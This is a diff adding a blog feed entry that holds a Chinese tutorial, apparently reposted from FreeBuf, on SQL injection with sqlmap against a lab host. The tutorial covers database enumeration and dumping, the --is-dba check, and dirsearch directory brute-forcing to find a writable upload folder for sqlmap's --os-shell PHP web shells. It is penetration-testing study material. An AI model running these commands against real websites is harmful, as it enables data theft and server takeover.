@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>sqlmap如何用dirsearch.py协助--os -shell拿到目标网站shell</title>
+      <link href="2020/12/18/sqlmap%E5%A6%82%E4%BD%95%E7%94%A8dirsearch.py%E5%8D%8F%E5%8A%A9--os%20-shell%E6%8B%BF%E5%88%B0%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99shell/"/>
+      <url>2020/12/18/sqlmap%E5%A6%82%E4%BD%95%E7%94%A8dirsearch.py%E5%8D%8F%E5%8A%A9--os%20-shell%E6%8B%BF%E5%88%B0%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99shell/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>本文为博主原创文章首发于<a href="https://freebuf.com/">FreeBuf</a>→<a href="https://www.freebuf.com/sectool/256588.html">https://www.freebuf.com/sectool/256588.html</a></p></blockquote><h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><p>sqlmap是一个开源渗透测试工具， 它可以自动检测和利用SQL注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>windows</strong><br>1、安装python(2.x或3.x版本)<br><a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a><br>2、下载sq|map并解压<br><a href="http://sqlmap.org/">http://sqlmap.org/</a><br>3、在sqlmap路径下打开cmd, python sqlmap.py即可运行<br><strong>linux</strong><br>1、kali系统自带<br>2、git clone –depth 1 <a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap -dev<br><strong>常用命令：</strong><br>1、<code>sqlmap.py -u &quot;url&quot;</code>      检测目标url是否存在注入<br>2、<code>sqlmap -u &quot;url&quot; --dbs</code>  爆出所有数据库信息<br>3、<code>sqlmap -u &quot;url&quot; --current-db</code>爆出当前数据库信息<br>4、<code>sqlmap -u &quot;url&quot; -D Database_ name -tables</code> 列出指定库名的所有表名<br>5、<code>sq|map -u &quot;url&quot; -D Database_ name -T Table_ name --columns</code>列出指定库名指定表名的所有列名<br>6、<code>sqlmap -u &quot;url&quot; -D Database_ name -T Table_ name -C columns1,colunms2, columns3 --dump</code>列出指定库名指定表名指定字段的数据</p><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>1、<code>sqlmap -r /root/aaa.txt --dbs --batch</code><br>2、<code>sqlmap -r /root/aa.txt --current-db</code><br>3、<code>sqImap -r /root/aaa.txt -D hetianlab --tables</code><br>4、<code>sqlmap -r /root/aaa.txt -D hetianlab -T user_ pwd --dump</code></p><h3 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h3><p>sqlmap -r /root/aaa.txt -p id –is-dba<br>sqlmap -r /rootaaa.txt -p id –os-shell<br>os-shell的执行条件有三个:<br>(1)网站必须是root权限<br>(2)攻击者需要知道网站的绝对路径<br>(3) GPC为off, php主动转义的功能关闭<br>当着三个条件都满足的时候，–os-shell命令才执行。</p><blockquote><p><strong>which web application Language does the web server support?</strong><br>[1] ASP<br>[2] ASPX<br>[3] JSP<br>[4] PHP (default )    #默认<br><strong>what do you want to use for writable directory?</strong><br>[1] common Location(s) ( /var/ww/, /var/www/html, /var /www/htdocs, /usr/Local/ apache2/htdocs,/usr/local/www/data, /var/apache2/htdocs, /var/www/ nginx- default, /srv/www/htdocs’) (default)<br>[2] custom Location(s)        #自定义<br>[3] custom directory list file<br>[4] brute force search</p></blockquote><p>话说回来，我们如何知道这个网站是不是root权限呢？<br>我们可以执行以下两个命令来查看网站当前的用户<br><code>sqLmap -u &quot;http://172 .26.2.36/vulnlab/ index . php?id=1&quot; --current -user</code><br>current –user查看当前的用户<br><code>sqLmap -u &quot;http://172 .26.2.36/vulnlab/ index . php?id=1&quot; --is -dba</code><br>指定去查找这个文件是否为dba，dba是databaseadmin，是数据库管理员用户的意思，如果返回值为true，则是root用户<br>这两个命令都可以🙆‍</p><h3 id="查查目录-dirsearch-py"><a href="#查查目录-dirsearch-py" class="headerlink" title="查查目录[dirsearch.py]"></a>查查目录[dirsearch.py]</h3><p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件。<br>dirsearch拥有以下特点：</p><blockquote><ul><li>多线程</li><li>可保持连接</li><li>支持多种后缀（-e|–extensions asp,php）</li><li>生成报告（纯文本，JSON）</li><li>启发式检测无效的网页</li><li>递归的暴力扫描</li><li>支持HTTP代理</li><li>用户代理随机化</li><li>批量处理</li><li>请求延迟</li></ul></blockquote><p><strong>扫描器与字典</strong><br>字典必须是文本文件，除了使用特殊的％EXT％之外，其余每行都会被处理。<br>例：<br> example/<br>example.%EXT%</p><p><strong>使用扩展名“asp”和“aspx”会生成下面的字典：</strong><br> example/<br>example.asp<br>example.aspx</p><p><strong>Linux下的使用示例：</strong><br> git clone <a href="https://github.com/maurosoria/dirsearch.git">https://github.com/maurosoria/dirsearch.git</a><br>cd dirsearch/<br>./dirsearch.py -u 目标网址 -e *<br>点击<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">下载地址</a>下载dirsearch-master并解压，将shell位置处于该脚本根目录，由于dirsearch需要python3.x，所以在使用前需要访问python.org下载相应版本的python,最后执行<code>python3 dirsearch.py -u xxxxxx</code>来使用。<br><code>-u</code>意为url，添加URL时可以添加他的协议头，但不要添加他的访问目录。<br><code>-e</code>指定查找的类型，如 -e dir意为指定查找目录信息,可帮助我们知道哪里可能存在上传的权限。-e php指定PHP语言类型，可以帮助我们查找是否有PHP语言的关键信息泄露。<br>常见的脚本语言类型有：<br>ASP<br>ASPX(ASP.NET)<br>JSP<br>PHP<br><img src="https://img-blog.csdnimg.cn/2020120317545640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="扫描目录过程"></p><p>它是利用爬虫和自带的字典爆破脚本进行的扫描。<br>如上图的返回值信息，如果是200、403、301这些数值的话，证明它是存在该目录/文件的。<br>再来观察上图的扫描过程中的结果，出现了一个upload，upload也就是上传，所谓上传，一般情况下我们是对此目录有可写权限的。<br>那么他的完整路径是什么呢？<br>根据在学校上学习的Apache服务建站，可以知道该网站如果是部署在Linux系统上，网站的默认根目录是<code>/var/www/html</code>或者是<code>/var/www/</code>。小型网站一般都不会改这个目录，那么upload的完整目录很有可能是<code>/var/www/html/upload</code>或<code>/var/www/upload</code>，两个都可以试一下</p><h3 id="回到-os-shell上"><a href="#回到-os-shell上" class="headerlink" title="回到-os shell上"></a>回到-os shell上</h3><p>①选择脚本语言选择4-PHP<br>②我们已经知道路径了，选择2-custom directory list file（自定义路径）<br>③输入我们知道的路径<code>/var/www/html/upload</code><br><img src="https://img-blog.csdnimg.cn/20201203181009572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tpbmdfSG8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当我们看到shell为<code>os-shell&gt;</code>的时候就代表成功了🎉<br>我们看到sqlmap给/var/www/html/upload目录里上传了两个PHP文件，<strong>tmpuknio.php</strong>、<strong>tmpbepcb.php</strong>由于他们两个的存在才拿到了这个权限，那么这两个PHP文件是属于web木马，这些文件的权限也就是php运行的权限，PHP是在Apache服务商运行的，我们可以通过<code>whoami</code>来验证是否正确<br><img src="https://img-blog.csdnimg.cn/20201203181604933.png" alt="os-shell&gt;"><br><img src="https://img-blog.csdnimg.cn/20201203182248711.png#pic_center" alt="whoami"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> kali </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title></title>
       <link href="2020/12/10/%E8%BF%99%E4%B8%AA2020%E5%88%9D/"/>
       <url>2020/12/10/%E8%BF%99%E4%B8%AA2020%E5%88%9D/</url>
